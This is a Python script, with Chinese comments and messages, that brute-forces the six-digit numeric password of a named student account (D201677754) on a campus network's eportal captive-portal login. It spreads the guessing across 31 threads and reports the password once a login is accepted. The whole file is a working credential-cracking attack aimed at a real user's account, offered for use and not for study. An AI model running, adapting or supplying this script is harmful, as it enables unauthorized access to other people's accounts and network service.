# -*- coding: utf-8 -*-
import os
import re
import sys
import string
import requests
import threading

flag = False
correct = "None"
def getpwd(username,query_str,minr,maxr):
	global flag
	global correct
	url = 'http://192.168.50.3:8080/eportal/InterFace.do?method=login'
	i = minr
	while i < maxr:
	    password = "%06d" % i
	    i = i + 1
	    post_data = {
	        'userId': username,
	        'password': password,
	        'queryString': query_str,
	        'service': '',
	        'operatorPwd': '',
	        'validcode': '',
	    }

	    responce = requests.request('POST', url, data=post_data)
	    responce.encoding = 'UTF-8'
	    res_json = responce.json()

	    if flag == False and (res_json['result'] == 'success' or res_json['message'] == '您的账户已欠费,为了不影响您正常使用网络,请尽快缴费!'):
	    	print(password+" "+"破解成功")
	    	correct = password
	    	flag = True
	    elif res_json['result'] == 'fail':
	    	if res_json['message'] == '密码不匹配,请输入正确的密码!':
	        	print("%d %s"%(i,password+" "+res_json['message']+" "+res_json['result']))
	    	else:
	    		print(password+" "+res_json['message']+" "+res_json['result'])
	    		# i = i - 1
	    		continue

	    if flag == True:
	    	return 

if __name__ == '__main__':
	# 测试请求
	try:
	    result = requests.get('http://www.baidu.com')
	except Exception:
	    print('Failed to connect test website!')
	    sys.exit()
	#未联网则开始破解
	if result.text.find('eportal') != -1:
		threadl = []
		usrname = 'D201677754' 
		pattarn = re.compile(r"href=.*?\?(.*?)'")
		query_str = pattarn.findall(result.text)
		for i in range(1,32):
			t = threading.Thread(target=getpwd, args =(usrname,query_str,10000*i,10000*(i+1)))
			threadl.append(t)
		for t in threadl:
			t.start()
		for t in threadl:
			t.join()
		print(usrname+" 正确密码为: "+correct)
		os.system("pause");
	elif result.text.find('baidu') != -1:
		print('请在未联网下进行')
	else:
		print("Opps, something goes wrong!")
